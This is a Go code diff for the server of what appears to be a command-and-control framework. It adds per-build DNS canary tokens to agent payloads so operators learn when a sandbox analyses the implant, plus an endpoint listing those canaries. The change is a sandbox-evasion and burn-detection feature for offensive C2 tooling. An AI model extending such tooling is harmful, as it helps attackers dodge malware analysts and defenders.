@@ -2,10 +2,12 @@ package server
 
 import (
 	"bytes"
+	"crypto/rand"
 	"crypto/tls"
 	"crypto/x509"
 	"encoding/base64"
 	"encoding/binary"
+	"encoding/hex"
 	"encoding/json"
 	"fmt"
 	"io"
@@ -86,6 +88,8 @@ func (s *Server) operatorMux() *http.ServeMux {
 	mux.HandleFunc("/api/mesh/", s.requireRole(RoleOperator, s.apiMesh))
 	// admin only
 	mux.HandleFunc("/api/roles",   s.requireRole(RoleAdmin, s.apiRoles))
+	mux.HandleFunc("/api/canaries", s.requireRole(RoleViewer, s.apiCanaries))
+
 	mux.HandleFunc("/api/ping", func(w http.ResponseWriter, r *http.Request) {
 		operator := operatorFromCert(r)
 		s.online.Heartbeat(operator)
@@ -737,6 +741,20 @@ func (s *Server) apiBuild(w http.ResponseWriter, r *http.Request) {
 		cfg.AgentCertPEM = string(certPEM)
 		cfg.AgentKeyPEM = string(keyPEM)
 		cfg.CACertPEM = string(s.ca.CACertPEM)
+	}
+
+	// Generate DNS canary token for burn detection in sandboxes.
+	// If a DNS C2 listener is active, embed a unique token so that sandbox
+	// analysis resolves "canary.<token>.<c2dns_domain>" and triggers a burn alert.
+	if cfg.CanaryDomain == "" {
+		if dnsDomain := s.activeDNSDomain(); dnsDomain != "" {
+			tokenBytes := make([]byte, 8)
+			rand.Read(tokenBytes) //nolint:errcheck
+			token := hex.EncodeToString(tokenBytes)
+			cfg.CanaryDomain = token + "." + dnsDomain
+			label := fmt.Sprintf("lang=%s transport=%s url=%s", cfg.Lang, cfg.Transport, cfg.ServerURL)
+			s.db.RegisterCanary(token, label) //nolint:errcheck
+		}
 	}
 
 	// stream=1 → SSE streaming build output (used by GUI for garble builds)
@@ -2671,3 +2689,12 @@ func (s *Server) apiMesh(w http.ResponseWriter, r *http.Request) {
 	}
 }
 
+
+func (s *Server) apiCanaries(w http.ResponseWriter, r *http.Request) {
+	rows, err := s.db.ListCanaries()
+	if err != nil {
+		jsonErr(w, err.Error(), http.StatusInternalServerError)
+		return
+	}
+	jsonOK(w, rows)
+}
